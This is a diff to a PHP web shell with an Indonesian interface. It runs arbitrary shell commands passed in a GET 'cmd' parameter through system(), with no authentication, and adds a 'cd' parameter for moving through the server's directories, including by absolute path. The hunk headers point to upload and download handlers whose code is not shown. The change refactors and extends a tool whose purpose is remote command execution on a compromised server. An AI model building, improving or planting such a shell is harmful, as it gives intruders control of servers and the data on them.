@@ -5,7 +5,6 @@ function h($str) {
     return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
 }
 
-
 if (!isset($_SESSION['cwd'])) {
     $_SESSION['cwd'] = getcwd();
 }
@@ -13,26 +12,44 @@ if (!isset($_SESSION['cwd'])) {
 $message = '';
 $msgColor = '';
 
+// Handle change directory via ?cd=...
+if (isset($_GET['cd'])) {
+    $raw = rawurldecode($_GET['cd']);
 
-if (isset($_GET['cmd'])) {
-    $cmd = $_GET['cmd'];
-
-    if (preg_match('/^cd\s+(.*)$/', $cmd, $m)) {
-        $targetDir = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $m[1]);
-        if ($targetDir && is_dir($targetDir)) {
-            $_SESSION['cwd'] = $targetDir;
-            $message = "Berpindah ke: " . h($_SESSION['cwd']);
-            $msgColor = "green";
+    // If absolute path (unix / or windows drive like C:\), use it directly; otherwise resolve relative to current cwd
+    if (PHP_OS_FAMILY === 'Windows') {
+        // Windows absolute: starts with letter + : or \\ (UNC)
+        if (preg_match('#^[A-Za-z]:[\\/]|^\\\\\\\\#', $raw)) {
+            $candidate = realpath($raw);
         } else {
-            $message = "Direktori tidak ditemukan: " . h($m[1]);
-            $msgColor = "red";
+            $candidate = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $raw);
         }
     } else {
-        chdir($_SESSION['cwd']);
-        ob_start();
-        system($cmd);
-        $output = ob_get_clean();
+        // Unix absolute: starts with /
+        if (strpos($raw, '/') === 0) {
+            $candidate = realpath($raw);
+        } else {
+            $candidate = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $raw);
+        }
     }
+
+    if ($candidate && is_dir($candidate)) {
+        $_SESSION['cwd'] = $candidate;
+        $message = "Berpindah ke: " . h($_SESSION['cwd']);
+        $msgColor = "green";
+    } else {
+        $message = "Direktori tidak ditemukan: " . h($raw);
+        $msgColor = "red";
+    }
+}
+
+// Exec command (kept as GET cmd)
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    chdir($_SESSION['cwd']);
+    ob_start();
+    system($cmd);
+    $output = ob_get_clean();
 }
 
 // Upload file
@@ -132,21 +149,23 @@ if (isset($_GET['download'])) {
         <nav class="text-blue-400 flex flex-wrap gap-1 font-mono select-none" aria-label="Breadcrumb">
             <?php
             $parts = explode(DIRECTORY_SEPARATOR, $_SESSION['cwd']);
+            $accum = '';
+
             if (PHP_OS_FAMILY === 'Windows' && preg_match('/^[A-Z]:$/i', $parts[0])) {
                 $accum = array_shift($parts);
-                echo "<a href='?cmd=cd%20" . urlencode($accum) . "' class='hover:underline'>" . h($accum) . "</a>";
+                echo "<a href='?cd=" . rawurlencode($accum) . "' class='hover:underline'>" . h($accum) . "</a>";
             } else {
-                $accum = '';
                 if (empty($parts[0])) {
-                    echo "<a href='?cmd=cd%20/' class='hover:underline'>/</a>";
+                    echo "<a href='?cd=" . rawurlencode('/') . "' class='hover:underline'>/</a>";
                     array_shift($parts);
                     $accum = '/';
                 }
             }
+
             foreach ($parts as $index => $part) {
                 if ($part === '') continue;
                 $accum = rtrim($accum, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
-                echo "<span>/</span><a href='?cmd=cd%20" . urlencode($accum) . "' class='hover:underline'>" . h($part) . "</a>";
+                echo "<span>/</span><a href='?cd=" . rawurlencode($accum) . "' class='hover:underline'>" . h($part) . "</a>";
             }
             ?>
         </nav>
@@ -157,11 +176,15 @@ if (isset($_GET['download'])) {
         <h2 class="text-xl font-semibold mb-4">Isi Folder:</h2>
         <ul class="list-disc list-inside space-y-1">
             <?php
-            foreach (scandir($_SESSION['cwd']) as $file) {
+            $items = scandir($_SESSION['cwd']);
+            foreach ($items as $file) {
                 if ($file === '.' || $file === '..') continue;
                 $fullPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file;
-                if (is_dir($fullPath)) {
-                    echo "<li><a href='?cmd=cd%20" . urlencode($file) . "' class='text-blue-400 font-medium hover:underline cursor-pointer'>[DIR] " . h($file) . "</a></li>";
+                $real = realpath($fullPath);
+                if ($real === false) continue; // skip broken symlinks etc.
+                if (is_dir($real)) {
+                    // link to the directory's realpath (encoded)
+                    echo "<li><a href='?cd=" . rawurlencode($real) . "' class='text-blue-400 font-medium hover:underline cursor-pointer'>[DIR] " . h($file) . "</a></li>";
                 } else {
                     echo "<li class='flex justify-between items-center gap-3'>
                             <span>[FILE] " . h($file) . "</span>
